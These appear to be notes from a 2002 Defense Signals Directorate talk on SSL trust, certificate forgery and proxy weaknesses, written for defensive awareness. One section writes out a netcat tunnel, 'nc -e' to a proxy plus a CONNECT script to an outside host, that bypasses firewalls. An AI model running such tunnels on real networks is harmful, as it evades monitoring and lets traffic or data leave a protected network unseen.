Abstract

This talk discussed some of Defense Signals Directorate's (DSD) concerns regarding the security of the Secure Sockets Layer (SSL) infrastructure deployed by almost all Internet users. It discussed the theory of proxying SSL, and the insecurities this causes. It then demonstrated a variety of symantec attacks against SSL users based on the injection of deceptive certificates into the Operating System certificate store.



The meeting

This meeting was held at the Australian Federal Police College, in Barton, ACT on 16 July 2002, between 5:30pm and 7:30pm. The speakers were Steven McLeod and Dr Michael Cohen from DSD.



Main issue is the trust mechanism

 - Normal port is 443



SSL was designed to solve two problems

 - intercept of data
 - proof of identity of the communicating parties

 

Threats

 - SSL is encrypted
 - Man in the middle should not be able to view traffic
  - Therefore no: firewalling, ids, virus scan, auditing



Normally

 - Client requests connect to server (CONNECT ... HTTP/1.1)
 - Firewall builds a tunnel
 - Client and server talk 



Dangerous

 - Run on outside machine: nc -l -p 443

#!/bin/bash
echo -e "CONNECT outside.machine.foo.com:443 HTTP/1.0\r\n\r\n"
 /dev/null

 - On inside machine: nc -e scriptfile.sh proxyhost 8080

 - There are windows apps to do this too (HTTPort)



WebDav

 - Web Distributed Authoring and Versioning
 - File management over HTTP
 - Upload arbitary files
 - Download arbitary files

 - Well supported on Windows especially
 - Most good web servers support it



Certificates

 - A digital statement collating a number of fields
 - Company name, server name, email address, public key
 - Signed by the certifying authority



Therefore

 - CA needs to perform identity checks
 - Cert can't be changed
 - Anyone can verify certificate
 - The decision of trust in a browser is made about whether the browser trusts the CA



Securing the server's private key

 - Apache uses a pass phrase to encrypt the private key
 - IIS doesn't bother!



Attacks

 - Man in the middle -- certificate stops this (or does it)
